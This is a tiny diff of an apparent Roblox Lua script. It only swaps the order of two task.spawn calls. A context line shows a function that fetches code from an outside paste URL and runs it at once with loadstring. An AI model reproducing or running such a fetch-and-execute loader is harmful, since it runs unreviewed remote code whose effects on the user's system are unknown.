@@ -7,5 +7,5 @@ local function asd1()
   loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xhqLmKmNElGIUkIV/raw"))()
 end
 
-task.spawn(asd1)
 task.spawn(asd)
+task.spawn(asd1)
